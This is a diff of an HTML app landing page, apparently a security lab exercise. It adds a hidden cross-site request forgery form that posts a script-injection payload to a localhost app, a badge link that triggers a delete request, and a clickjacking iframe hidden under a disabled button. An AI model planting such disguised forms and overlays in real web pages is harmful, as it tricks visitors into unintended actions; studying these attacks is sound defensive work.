@@ -61,7 +61,10 @@
         <div class="col-lg-7 my-auto">
           <div class="header-content mx-auto">
             <h1 class="mb-5">New Age is an app landing page that will help you beautifully showcase your new mobile app, or anything else!</h1>
-            <a href="#download" class="btn btn-outline btn-xl js-scroll-trigger">Start Now for Free!</a>
+            <form action="http://localhost:8080/publish/2" method="POST">
+              <input type="hidden" name="description" value="<script>alert('Pwned')</script>">
+              <a href="#download" onclick="this.parentNode.submit()" class="btn btn-outline btn-xl js-scroll-trigger">Start Now for Free!</a>
+            </form>
           </div>
         </div>
         <div class="col-lg-5 my-auto">
@@ -90,7 +93,7 @@
           <h2 class="section-heading">Discover what all the buzz is about!</h2>
           <p>Our app is available on any mobile device! Download now to get started!</p>
           <div class="badges">
-            <a class="badge-link" href="#"><img src="img/google-play-badge.svg" alt=""></a>
+            <a class="badge-link" href="http://localhost:8080/delete/1"><img src="img/google-play-badge.svg" alt=""></a>
             <a class="badge-link" href="#"><img src="img/app-store-badge.svg" alt=""></a>
           </div>
         </div>
@@ -165,7 +168,15 @@
     <div class="cta-content">
       <div class="container">
         <h2>Stop waiting.<br>Start building.</h2>
-        <a href="#contact" class="btn btn-outline btn-xl js-scroll-trigger">Let's Get Started!</a>
+        <div style="margin-left:25px;width: 78px;height: 38px;overflow:hidden;position:relative;">
+          <iframe src="http://localhost:8080/publish/4" style="position:absolute;top: -558px;left: -85px;width:1280px;height:1200px;" scrolling=no></iframe>
+        </div>
+        <a href="#contact" class="btn btn-outline btn-xl js-scroll-trigger" style="
+            position: relative;
+            top: -41px;
+            background-color: gray;
+            pointer-events: none;
+        ">Start</a>
       </div>
     </div>
     <div class="overlay"></div>
